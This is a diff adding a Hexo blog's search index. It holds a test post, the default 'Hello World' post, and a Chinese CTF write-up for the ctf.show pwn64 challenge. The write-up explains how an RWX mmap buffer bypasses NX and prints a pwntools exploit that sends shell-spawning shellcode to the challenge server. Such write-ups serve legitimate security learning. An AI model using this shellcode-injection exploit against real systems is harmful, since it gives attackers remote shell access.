@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>测试文章</title>
+    <url>/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
+    <content><![CDATA[<p>这是一篇测试文章</p>
+<img src="/2021/06/10/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/test.png" class="" title="图片引用方法一">
+
+<p><img src="/test.png" alt="图片引用方法二"> <img src="/images/test.png" alt="图片引用方法三"></p>
+<p><img src="/images/test.png" alt="图片引用方法三"></p>
+]]></content>
+      <categories>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>原创</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2025/11/03/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2025/11/07/pwn%2064/</url>
+    <content><![CDATA[<h2 id="pwn64"><a href="#pwn64" class="headerlink" title="pwn64"></a>pwn64</h2><p><a href="https://ctf.show/challenges#pwn64-4074">ctf.show pwn64</a></p>
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li><a href="#jump1">题目</a></li>
+<li><a href="#jump2">预计时间</a></li>
+<li><a href="#jump3">题目分析及截图</a></li>
+</ul>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id='jump1'>题目</a></h4><p><img src="C:\Users\ASUS\hexo-blog\source_posts\pwn64\1.png" alt="1"></p>
+<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id ='jump2'>预计时间</a></h4><p>1h</p>
+<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a>题目分析及截图</a></h4><p>我们先<code>checksec</code>一下看看程序的保护机制</p>
+<p><img src="C:\Users\ASUS\hexo-blog\source_posts\pwn64\2.png" alt="2"></p>
+<p>可以看到NX保护机制是开启的，那么是不是就意味着<code>shellcode</code>用不了？？我们往下看看</p>
+<p>我们用ida查看程序的main函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap(<span class="number">0</span>, <span class="number">0x400u</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0xAu</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Some different!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x400u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Illegal entry!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>buf = mmap(0, 0x400u, 7, 34, 0, 0);</code><ul>
+<li><code>mmap</code>用于在进程的虚拟地址空间中<strong>创建一段内存映射</strong></li>
+<li>第一个参数<code>0</code>：表示addr&#x3D;0，请求内核“直接给我一个地址”</li>
+<li>第二个参数<code>0x400u</code>：表示length&#x3D;0x400u,请求映射的大小是0x400u</li>
+<li>第三个参数<code>7</code>：这是权限位。<code>port_write = 1</code>,<code>port_read=2</code>,<code>port_e=4</code>,这里的7&#x3D;1+2+4，表示有可读可写可执行的权限</li>
+</ul>
+</li>
+<li><code>read(0, buf, 0x400u) &lt; 0</code><ul>
+<li><strong>第一个参数0</strong>的意思是输入<ul>
+<li>0：输入</li>
+<li>1：输出</li>
+<li>2：标准错误</li>
+</ul>
+</li>
+<li><code>&lt;0</code>是什么意思？<ul>
+<li>read返回值&lt;0时，意味着读取失败</li>
+<li>read正常返回时，值是实际读取的字符</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>**综上：**虽然我<code>checksec ./pwn</code>时开启了NX权限，但是在buf这一段缓冲区，因为<code>mmap</code>的原因，这一段是具有可读可写可执行权限的。</p>
+<p><code>NX enabled</code> ≠ 全程禁止执行新内存：NX 是默认策略，程序可通过 <code>mmap</code>&#x2F;<code>mprotect</code> 申请可执行页（如果内核安全策略允许）。</p>
+<p>到这里不难理解为什么题目描述是<strong>有时候开启某种保护并不代表这条路不通</strong>,就是上面的原因。我们依旧使用shellcode</p>
+<p>exp如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28112</span>)</span><br><span class="line">shellcode = <span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line">payload = shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>至此，这道题就结束了</p>
+<p>但是在我写的时候，我在疑惑它的偏移（我昏头了），因为这道题是不涉及栈溢出的，我们根本不需要去计算偏移去覆盖返回地址。但是本道题的目的是在buf中写入shellcode并调用它</p>
+<p>希望可以帮到你，加油</p>
+]]></content>
+  </entry>
+</search>
